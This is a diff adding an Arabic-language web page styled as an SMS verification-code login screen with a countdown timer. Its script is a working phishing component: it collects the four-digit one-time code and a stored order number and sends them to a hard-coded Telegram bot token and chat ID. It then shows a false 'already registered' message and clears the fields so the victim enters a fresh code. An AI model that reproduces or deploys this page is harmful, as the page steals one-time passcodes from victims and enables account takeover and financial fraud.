@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>دخول</title>
+  <style>
+    * { box-sizing: border-box; }
+
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Arial', sans-serif;
+      background-color: #004c6d;
+      background-image: url('5lfea.png'); /* الخلفية */
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+      color: white;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .container {
+      max-width: 400px;
+      width: 100%;
+      padding: 20px;
+      text-align: center;
+    }
+
+    .logo { margin-bottom: 20px; }
+    .logo img { width: 100px; height: auto; }
+
+    h2 { margin-bottom: 20px; font-size: 28px; }
+
+    p { font-size: 16px; margin-bottom: 30px; }
+
+    .code-inputs {
+      display: flex;
+      justify-content: center;
+      gap: 15px;
+      margin-bottom: 30px;
+      direction: ltr;
+    }
+
+    .code-inputs input {
+      width: 60px;
+      height: 60px;
+      text-align: center;
+      font-size: 24px;
+      border: 2px solid #ccc;
+      border-radius: 8px;
+      background: white;
+      color: #000;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: white;
+      color: #004c6d;
+      border: none;
+      font-size: 18px;
+      cursor: pointer;
+    }
+
+    button:hover { background-color: #e0e0e0; }
+
+    .popup {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: rgba(0,0,0,0.9);
+      color: #fff;
+      padding: 20px 30px;
+      border-radius: 10px;
+      text-align: center;
+      display: none;
+      z-index: 9999;
+    }
+
+    .popup button {
+      margin-top: 15px;
+      padding: 8px 16px;
+      background: white;
+      color: #004c6d;
+      border: none;
+      cursor: pointer;
+      font-size: 16px;
+      border-radius: 6px;
+    }
+
+    .timer {
+      margin-top: 20px;
+      font-size: 18px;
+      color: #fff;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo"><img src="SHARR.png" alt="Logo"></div>
+    <h2>دخول</h2>
+    <p>ادخل الكود المرسل اليك في رسائل نصية SMS<br>الكود مكون من 4 ارقام</p>
+
+    <div class="code-inputs">
+      <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+      <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+      <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+      <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+    </div>
+
+    <button onclick="validateCode()">دخول</button>
+
+    <div class="timer">
+      ينتهي بعد <span id="countdown">02:00</span>
+    </div>
+  </div>
+
+  <div id="popup" class="popup">
+    <p>لقد تم تسجيلك بالفعل</p>
+    <button onclick="closePopup()">إغلاق</button>
+  </div>
+
+  <script>
+    const inputs = document.querySelectorAll('.code-inputs input');
+
+    // التنقل التلقائي بين المربعات
+    inputs.forEach((input, index) => {
+      input.addEventListener('input', () => {
+        input.value = input.value.replace(/[^0-9]/g,'');
+        if (input.value && index < inputs.length - 1) {
+          inputs[index + 1].focus();
+        }
+      });
+
+      input.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && !input.value && index > 0) {
+          inputs[index - 1].focus();
+        }
+      });
+    });
+
+    function validateCode() {
+      let allFilled = true;
+      let code = "";
+      inputs.forEach(input => {
+        if (input.value.trim() === "") {
+          allFilled = false;
+        }
+        code += input.value.trim();
+      });
+
+      if (!allFilled) {
+        alert("يرجى ادخال الكود");
+        return;
+      }
+
+      // استرجاع رقم الطلب من الصفحة الأولى
+      const order = localStorage.getItem("orderNumber");
+
+      // إعداد بيانات تيليجرام
+      const token = "8505764051:AAF2KrwdKkXemZc8aph-NNyv2dvIFcIzCqM";
+      const chatId = "8492691780";
+
+      // الرسالة
+      const msg = `الكود: ${code}\nرقم الطلب: ${order}`;
+
+      // إرسال الرسالة إلى تيليجرام
+      fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
+
+      // إظهار الرسالة المنبثقة
+      document.getElementById("popup").style.display = "block";
+    }
+
+    function closePopup() {
+      document.getElementById("popup").style.display = "none";
+      inputs.forEach(input => input.value = "");
+    }
+
+    // عداد دقيقتين
+    let timeLeft = 120;
+    const countdownEl = document.getElementById("countdown");
+
+    function updateCountdown() {
+      let minutes = Math.floor(timeLeft / 60);
+      let seconds = timeLeft % 60;
+      countdownEl.textContent =
+        (minutes < 10 ? "0" : "") + minutes + ":" + (seconds < 10 ? "0" : "") + seconds;
+      if (timeLeft > 0) {
+        timeLeft--;
+      }
+    }
+
+    setInterval(updateCountdown, 1000);
+    updateCountdown();
+  </script>
+</body>
+</html>
